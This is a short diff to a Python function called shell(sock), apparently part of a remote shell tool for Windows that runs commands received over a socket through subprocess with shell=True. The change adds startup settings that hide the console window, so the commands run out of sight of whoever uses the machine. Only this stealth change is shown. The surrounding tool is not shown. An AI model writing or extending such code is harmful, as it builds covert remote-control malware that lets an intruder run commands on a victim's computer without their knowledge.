@@ -99,8 +99,12 @@ def shell(sock):
         else:
             # Command Execution with CP437 for Windows 11 Compatibility
             try:
+                su = subprocess.STARTUPINFO()
+                su.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                su.wShowWindow = subprocess.SW_HIDE
                 proc = subprocess.Popen(
                     command, 
+                    startupinfo=su,
                     shell=True, 
                     stdout=subprocess.PIPE, 
                     stderr=subprocess.PIPE, 
